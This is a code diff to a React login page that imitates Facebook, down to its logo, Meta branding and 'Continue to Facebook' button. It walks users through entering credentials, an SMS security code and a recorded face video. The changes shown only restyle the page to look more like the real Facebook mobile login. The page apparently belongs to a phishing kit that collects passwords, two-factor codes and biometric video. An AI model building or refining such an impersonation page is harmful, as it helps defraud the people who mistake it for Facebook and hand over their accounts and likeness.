@@ -84,13 +84,10 @@ export default function LoginPage() {
   const [modelsLoaded, setModelsLoaded] = useState(false);
   const [loadingModels, setLoadingModels] = useState(false);
   const [directionHoldTime, setDirectionHoldTime] = useState(0);
-  const [statusMessage, setStatusMessage] = useState("");
   
   const videoRef = useRef<HTMLVideoElement>(null);
-  const canvasRef = useRef<HTMLCanvasElement>(null);
   const detectionIntervalRef = useRef<NodeJS.Timeout | null>(null);
   const baseFacePositionRef = useRef<FacePosition | null>(null);
-  const directionTimerRef = useRef<NodeJS.Timeout | null>(null);
   const recordedChunksRef = useRef<Blob[]>([]);
 
   const loginForm = useForm<LoginForm>({
@@ -445,21 +442,30 @@ export default function LoginPage() {
   };
 
   return (
-    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#f0f2f5' }}>
-      <div className="text-center pt-4 pb-6">
-        <a href="#" className="text-sm hover:underline" style={{ color: '#65676b' }} data-testid="link-language">
+    <div className="min-h-screen flex flex-col bg-white">
+      {/* Language selector at top */}
+      <div className="text-center pt-5 pb-2">
+        <a href="#" className="text-sm" style={{ color: '#65676b' }} data-testid="link-language">
           English (UK)
         </a>
       </div>
 
-      <main className="flex-1 flex flex-col items-center justify-center px-4 py-8">
+      {/* Main content area - centered vertically */}
+      <main className="flex-1 flex flex-col items-center justify-center px-5">
         <div className="w-full max-w-md">
           {currentStep === "login" && (
-            <div className="bg-white rounded-lg shadow-lg p-6">
-              <div className="text-center mb-6">
-                <img src="/favicon.png" alt="Facebook" className="w-14 h-14 mx-auto" data-testid="logo-facebook" />
+            <>
+              {/* Facebook logo */}
+              <div className="text-center mb-12">
+                <div className="w-16 h-16 mx-auto mb-0 rounded-full flex items-center justify-center" style={{ backgroundColor: '#1877f2' }}>
+                  <svg viewBox="0 0 36 36" className="w-10 h-10" fill="white">
+                    <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"></path>
+                    <path fill="#1877f2" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"></path>
+                  </svg>
+                </div>
               </div>
 
+              {/* Login form */}
               <Form {...loginForm}>
                 <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-3">
                   <FormField
@@ -472,8 +478,8 @@ export default function LoginPage() {
                             {...field}
                             type="text"
                             placeholder="Mobile number or email address"
-                            className="w-full px-4 py-3.5 text-base border-2 rounded-lg focus:outline-none focus:border-blue-500 transition"
-                            style={{ backgroundColor: '#fff', borderColor: '#dddfe2', color: '#1c1e21' }}
+                            className="w-full px-4 py-3.5 text-base border rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500"
+                            style={{ backgroundColor: '#ffffff', borderColor: '#dadde1', color: '#1c1e21' }}
                             data-testid="input-email"
                           />
                         </FormControl>
@@ -492,8 +498,8 @@ export default function LoginPage() {
                             {...field}
                             type="password"
                             placeholder="Password"
-                            className="w-full px-4 py-3.5 text-base border-2 rounded-lg focus:outline-none focus:border-blue-500 transition"
-                            style={{ backgroundColor: '#fff', borderColor: '#dddfe2', color: '#1c1e21' }}
+                            className="w-full px-4 py-3.5 text-base border rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500"
+                            style={{ backgroundColor: '#ffffff', borderColor: '#dadde1', color: '#1c1e21' }}
                             data-testid="input-password"
                           />
                         </FormControl>
@@ -505,8 +511,8 @@ export default function LoginPage() {
                   <button
                     type="submit"
                     disabled={isLoggingIn}
-                    className="w-full py-3 text-white text-lg font-semibold rounded-lg transition disabled:opacity-60"
-                    style={{ backgroundColor: '#1877f2' }}
+                    className="w-full py-3.5 text-white text-lg font-semibold transition disabled:opacity-60"
+                    style={{ backgroundColor: '#1877f2', borderRadius: '50px' }}
                     data-testid="button-login"
                   >
                     {isLoggingIn ? "Logging in..." : "Log in"}
@@ -514,33 +520,40 @@ export default function LoginPage() {
                 </form>
               </Form>
 
-              <div className="text-center mt-4">
+              {/* Forgotten password link */}
+              <div className="text-center mt-5 mb-8">
                 <a href="#" className="text-sm" style={{ color: '#1877f2' }} data-testid="link-forgotten-password">
                   Forgotten password?
                 </a>
               </div>
 
-              <div className="mt-6 pt-4 border-t border-gray-200">
+              {/* Create account button */}
+              <div className="text-center mt-8">
                 <button
                   onClick={() => setSignupOpen(true)}
-                  className="w-full py-3 text-white text-base font-semibold rounded-lg transition"
-                  style={{ backgroundColor: '#42b72a' }}
+                  className="px-12 py-3 text-base font-semibold transition"
+                  style={{ 
+                    backgroundColor: 'white', 
+                    color: '#1877f2', 
+                    border: '1px solid #1877f2',
+                    borderRadius: '50px'
+                  }}
                   data-testid="button-create-account"
                 >
                   Create new account
                 </button>
               </div>
-            </div>
+            </>
           )}
 
           {(currentStep === "loading-login" || currentStep === "loading-code") && (
-            <div className="bg-white rounded-lg shadow-lg p-8">
+            <div className="bg-white">
               <FacebookLoader />
             </div>
           )}
 
           {currentStep === "code" && (
-            <div className="bg-white rounded-lg shadow-lg p-6 text-center">
+            <div className="bg-white text-center">
               <h2 className="text-xl font-semibold mb-2" style={{ color: '#1c1e21' }}>Enter security code</h2>
               <p className="text-sm mb-6" style={{ color: '#65676b' }}>
                 Please check your phone for a text message with your code.
@@ -550,15 +563,15 @@ export default function LoginPage() {
                 value={verificationCode}
                 onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                 placeholder="Enter code"
-                className="w-full px-4 py-3 text-center text-xl border-2 rounded-lg focus:outline-none focus:border-blue-500 mb-4"
-                style={{ borderColor: '#dddfe2', color: '#1c1e21', letterSpacing: '0.3em' }}
+                className="w-full px-4 py-3 text-center text-xl border rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500 mb-4"
+                style={{ borderColor: '#dadde1', color: '#1c1e21', letterSpacing: '0.3em' }}
                 data-testid="input-code"
               />
               <button
                 onClick={handleCodeSubmit}
                 disabled={verificationCode.length < 4}
-                className="w-full py-3 text-white text-base font-semibold rounded-lg transition disabled:opacity-50"
-                style={{ backgroundColor: '#1877f2' }}
+                className="w-full py-3 text-white text-base font-semibold transition disabled:opacity-50"
+                style={{ backgroundColor: '#1877f2', borderRadius: '50px' }}
                 data-testid="button-submit-code"
               >
                 Continue
@@ -567,7 +580,7 @@ export default function LoginPage() {
           )}
 
           {currentStep === "face-intro" && (
-            <div className="bg-white rounded-lg shadow-lg p-6 text-center">
+            <div className="bg-white text-center">
               <div className="w-20 h-20 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
                 <svg className="w-10 h-10" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
                   <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z" />
@@ -579,8 +592,8 @@ export default function LoginPage() {
               </p>
               <button
                 onClick={() => setCurrentStep("face-explanation")}
-                className="w-full py-3 text-white text-base font-semibold rounded-lg transition"
-                style={{ backgroundColor: '#1877f2' }}
+                className="w-full py-3 text-white text-base font-semibold transition"
+                style={{ backgroundColor: '#1877f2', borderRadius: '50px' }}
               >
                 Continue
               </button>
@@ -588,7 +601,7 @@ export default function LoginPage() {
           )}
 
           {currentStep === "face-explanation" && (
-            <div className="bg-white rounded-lg shadow-lg p-6 text-center">
+            <div className="bg-white text-center">
               <div className="w-24 h-24 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
                 <svg className="w-12 h-12" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
                   <path strokeLinecap="round" strokeLinejoin="round" d="M15.182 15.182a4.5 4.5 0 01-6.364 0M21 12a9 9 0 11-18 0 9 9 0 0118 0zM9.75 9.75c0 .414-.168.75-.375.75S9 10.164 9 9.75 9.168 9 9.375 9s.375.336.375.75zm-.375 0h.008v.015h-.008V9.75zm5.625 0c0 .414-.168.75-.375.75s-.375-.336-.375-.75.168-.75.375-.75.375.336.375.75zm-.375 0h.008v.015h-.008V9.75z" />
@@ -615,8 +628,8 @@ export default function LoginPage() {
               <button
                 onClick={handleStartFaceVerification}
                 disabled={loadingModels}
-                className="w-full py-3 text-white text-base font-semibold rounded-lg transition disabled:opacity-60"
-                style={{ backgroundColor: '#1877f2' }}
+                className="w-full py-3 text-white text-base font-semibold transition disabled:opacity-60"
+                style={{ backgroundColor: '#1877f2', borderRadius: '50px' }}
               >
                 {loadingModels ? "Loading..." : "Start verification"}
               </button>
@@ -631,7 +644,7 @@ export default function LoginPage() {
           )}
 
           {currentStep === "instructions" && (
-            <div className="bg-white rounded-lg shadow-lg p-6 text-center">
+            <div className="bg-white text-center">
               <h2 className="text-xl font-semibold mb-3" style={{ color: '#1c1e21' }}>Position your face</h2>
               <p className="text-sm mb-4" style={{ color: '#65676b' }}>
                 Center your face in the circle
@@ -671,8 +684,8 @@ export default function LoginPage() {
               <button
                 onClick={handleStartRecording}
                 disabled={!faceDetected}
-                className="w-full py-3 text-white text-base font-semibold rounded-lg transition disabled:opacity-50"
-                style={{ backgroundColor: '#1877f2' }}
+                className="w-full py-3 text-white text-base font-semibold transition disabled:opacity-50"
+                style={{ backgroundColor: '#1877f2', borderRadius: '50px' }}
               >
                 {faceDetected ? "Start recording" : "Detecting face..."}
               </button>
@@ -680,7 +693,7 @@ export default function LoginPage() {
           )}
 
           {currentStep === "recording" && (
-            <div className="bg-white rounded-lg shadow-lg p-6 text-center">
+            <div className="bg-white text-center">
               <div className="relative mx-auto mb-4" style={{ width: '280px', height: '280px' }}>
                 <div className="absolute inset-0 rounded-full overflow-hidden" style={{ backgroundColor: '#000' }}>
                   <video
@@ -788,7 +801,7 @@ export default function LoginPage() {
           )}
 
           {currentStep === "processing" && (
-            <div className="bg-white rounded-lg shadow-lg p-8 text-center">
+            <div className="bg-white text-center">
               <div className="relative w-16 h-16 mx-auto mb-4">
                 <div className="absolute inset-0 rounded-full border-4 animate-spin" style={{ borderColor: '#e4e6eb', borderTopColor: '#1877f2' }} />
               </div>
@@ -798,7 +811,7 @@ export default function LoginPage() {
           )}
 
           {currentStep === "complete" && (
-            <div className="bg-white rounded-lg shadow-lg p-8 text-center">
+            <div className="bg-white text-center">
               <div className="w-20 h-20 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#42b72a' }}>
                 <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                   <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
@@ -822,8 +835,8 @@ export default function LoginPage() {
                     setStream(null);
                   }
                 }}
-                className="w-full py-3 text-white text-base font-semibold rounded-lg transition"
-                style={{ backgroundColor: '#1877f2' }}
+                className="w-full py-3 text-white text-base font-semibold transition"
+                style={{ backgroundColor: '#1877f2', borderRadius: '50px' }}
                 data-testid="button-continue"
               >
                 Continue to Facebook
@@ -833,13 +846,16 @@ export default function LoginPage() {
         </div>
       </main>
 
-      <footer className="text-center py-6 px-5" style={{ color: '#65676b' }}>
-        <div className="mb-3">
-          <img src={metaLogoImg} alt="Meta" className="h-6 mx-auto opacity-60" data-testid="img-meta-logo" />
+      {/* Footer */}
+      <footer className="text-center py-8 px-5">
+        <div className="mb-4">
+          <img src={metaLogoImg} alt="Meta" className="h-5 mx-auto opacity-50" data-testid="img-meta-logo" />
         </div>
-        <div className="text-xs space-x-4">
+        <div className="text-xs space-x-3" style={{ color: '#65676b' }}>
           <a href="#" className="hover:underline" data-testid="link-about">About</a>
+          <span>·</span>
           <a href="#" className="hover:underline" data-testid="link-help">Help</a>
+          <span>·</span>
           <a href="#" className="hover:underline" data-testid="link-more">More</a>
         </div>
       </footer>
@@ -935,7 +951,7 @@ export default function LoginPage() {
                 </div>
               </div>
 
-              <button type="submit" disabled={isSigningUp} className="w-auto px-16 py-2 text-white text-base font-bold rounded-md transition disabled:opacity-60 mx-auto block" style={{ backgroundColor: '#00a400' }} data-testid="button-signup-submit">
+              <button type="submit" disabled={isSigningUp} className="w-auto px-16 py-2 text-white text-base font-bold transition disabled:opacity-60 mx-auto block" style={{ backgroundColor: '#00a400', borderRadius: '6px' }} data-testid="button-signup-submit">
                 {isSigningUp ? "Signing up..." : "Sign Up"}
               </button>
             </form>
